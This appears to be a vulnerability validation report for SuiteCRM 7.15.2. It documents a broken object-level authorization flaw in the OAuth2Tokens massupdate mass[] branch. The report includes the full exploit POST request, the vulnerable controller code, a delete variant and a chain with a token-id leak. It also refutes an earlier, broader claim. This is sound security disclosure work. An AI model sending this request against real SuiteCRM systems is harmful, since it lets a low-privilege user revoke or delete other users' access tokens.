# VULN-025 — `OAuth2Tokens massupdate` (mass[] branch) revokes/deletes any user's token by id

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED (with corrected mechanism — see Observation)
**Severity (static)**: High
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: 2026-09-28

## Preconditions
- Any authenticated user (attacker, disposable RegularUser).
- A victim OAuth token exists and the attacker knows its **row id** (obtainable via VULN-082's OAuth-token leak or an IDOR). The exploit mints a victim token (assigned to admin) as the precondition and resolves its row id via the admin's REST `get_entry_list`.

## Request
```
POST /index.php
Referer: http://localhost:33116/index.php?module=OAuth2Tokens&action=index
Cookie: PHPSESSID=<attacker low-priv session>
Content-Type: application/x-www-form-urlencoded

module=OAuth2Tokens&action=massupdate&mass[]=<victim_token_row_id>&return_module=OAuth2Tokens&return_action=index&current_query_by_page=%7B%7D
```

## Response
`HTTP 301` (success, no XSRF block). Functional impact (see `response.txt`):
```
victim V8 call BEFORE: HTTP 200      (GET /Api/V8/module/Accounts with the victim token)
attacker massupdate  : HTTP 301
victim V8 call AFTER : HTTP 401      (token now revoked)
```
The victim's (admin's) previously-working OAuth token stops working after the low-priv attacker's request.

## Observation — MECHANISM CORRECTION
The static finding claimed the `select_entire_list=1 → get_full_list()` branch revokes **every** user's tokens. **Dynamically refuted:** `OAuth2Tokens::create_new_list_query` (`modules/OAuth2Tokens/OAuth2Tokens.php:151-163`) returns unscoped for admins but appends `AND assigned_user_id = '<currentUserId>'` for non-admins, so the `select_entire_list` branch is **owner-scoped** — a non-admin only affects their own tokens (verified live: a low-priv `select_entire_list` massupdate left all 5 other tokens unrevoked).

The **real** vulnerability is the OTHER branch, `modules/OAuth2Tokens/controller.php:63-72`:
```php
} elseif (!empty($_REQUEST['mass'])) {
    foreach ($_REQUEST['mass'] as $id) {
        $token = BeanFactory::getBean('OAuth2Tokens', $id);   // by id, ANY owner, no ACL
        ... $token->token_is_revoked = true; $token->save();
    }
}
```
`mass[]=<id>` loads and revokes/deletes a token by id with **no ACL/owner check** → BOLA. Confirmed: a low-priv user revoked admin's token (200→401). It is gated on knowing the token row id (a GUID), which VULN-082 leaks to low-priv users. `&Delete=true` deletes instead of revoking.

## Side effects
- Creates one OAuth2 client + one victim token (assigned to admin) as fixtures, then revokes that token. Recoverable (the victim re-authenticates). Creates one disposable RegularUser.

## Research & references
- OWASP API Security Top 10 — API1:2023 BOLA; OWASP WSTG-ATHZ-04 (Testing for IDOR).
- CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-862.
- Chains with VULN-082 (leaks OAuth token ids/material to low-priv users).

## If FAILED
n/a — CONFIRMED (mass[] branch). The `select_entire_list` sub-claim is refuted (owner-scoped); documented above.
## If NEEDS_MANUAL
n/a.
